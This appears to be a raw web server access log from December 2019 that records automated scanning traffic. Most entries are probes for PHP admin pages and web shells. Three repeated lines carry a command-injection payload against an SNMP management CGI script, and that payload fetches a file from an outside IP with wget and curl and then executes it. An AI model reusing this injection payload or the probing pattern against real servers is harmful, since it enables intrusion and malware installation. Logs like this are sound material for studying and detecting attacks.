189.131.46.65 - - [13/Dec/2019:23:46:32 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
170.247.4.27 - - [14/Dec/2019:00:15:48 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.119.84.73 - - [14/Dec/2019:00:49:05 +0000] "GET /login/submit/onlyy HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
138.99.216.147 - - [14/Dec/2019:02:28:17 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/75.0.3770.100 Safari/537.36"
92.241.70.178 - - [14/Dec/2019:04:25:37 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
208.97.139.102 - - [14/Dec/2019:06:01:20 +0000] "POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://145.249.106.241/richard; curl -O http://145.249.106.241/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.0" 404 169 "-" "-"
208.97.139.102 - - [14/Dec/2019:06:01:20 +0000] "POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://145.249.106.241/richard; curl -O http://145.249.106.241/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.0" 404 169 "-" "-"
208.97.139.102 - - [14/Dec/2019:06:01:21 +0000] "POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://145.249.106.241/richard; curl -O http://145.249.106.241/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.0" 404 169 "-" "-"
85.101.118.25 - - [04/Dec/2019:06:59:34 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:04:59 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:03 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:06 +0000] "POST /da83f1c0/admin.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:07 +0000] "POST /da83f1c0/admin.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:07 +0000] "POST /da83f1c0/admin.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:09 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
129.28.121.194 - - [04/Dec/2019:07:05:11 +0000] "GET /l.php HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
129.28.121.194 - - [04/Dec/2019:07:05:11 +0000] "GET /phpinfo.php HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
129.28.121.194 - - [04/Dec/2019:07:05:13 +0000] "GET /test.php HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
129.28.121.194 - - [04/Dec/2019:07:05:15 +0000] "POST /index.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:15 +0000] "POST /bbs.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:15 +0000] "POST /forum.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:19 +0000] "POST /forums.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:19 +0000] "POST /bbs/index.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:20 +0000] "POST /forum/index.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:23 +0000] "POST /forums/index.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.28.121.194 - - [04/Dec/2019:07:05:31 +0000] "GET /help.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:31 +0000] "GET /webdav/ HTTP/1.1" 404 169 "-" "Mozilla/5.0"
129.28.121.194 - - [04/Dec/2019:07:05:31 +0000] "GET /java.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:31 +0000] "GET /_query.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:34 +0000] "GET /test.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:35 +0000] "GET /db_cts.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:35 +0000] "GET /db_pma.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:35 +0000] "GET /logon.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:35 +0000] "GET /help-e.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:36 +0000] "GET /license.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:37 +0000] "GET /log.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:37 +0000] "GET /hell.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:38 +0000] "GET /pmd_online.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:38 +0000] "GET /x.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.28.121.194 - - [04/Dec/2019:07:05:38 +0000] "GET /shell.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
